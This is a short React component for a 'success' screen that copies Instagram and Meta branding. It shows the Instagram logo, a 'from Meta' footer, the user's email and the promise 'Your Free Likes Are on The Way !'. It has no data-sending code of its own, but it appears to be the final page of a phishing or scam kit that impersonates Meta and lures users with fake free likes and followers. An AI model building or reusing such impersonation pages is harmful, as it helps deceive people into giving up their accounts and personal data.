import "./SuccessPage.css";

export default function SuccessPage({ email }) {
  return (
    <div className="success-page">
      <div className="success-page__content">
        <div className="success-page__icon">
          <img
            src="/instagram-logo.png"
            alt="Instagram"
            className="success-page__logo"
          />
        </div>
        <div className="success-page__checkmark">
          <svg
            viewBox="0 0 52 52"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <circle cx="26" cy="26" r="25" stroke="#0095f6" strokeWidth="2" />
            <path
              d="M14 27L22 35L38 19"
              stroke="#0095f6"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
        </div>
        <h1 className="success-page__title">
          Your Free Likes Are on The Way !
        </h1>
        <p className="success-page__subtitle">
          Congrats ! You Will Get Free Likes and Followers Soon.
        </p>
        {email && <p className="success-page__email">{email}</p>}
      </div>

      <div className="success-page__footer">
        <p className="meta-footer-from">from</p>
        <p className="meta-footer-name">Meta</p>
      </div>
    </div>
  );
}
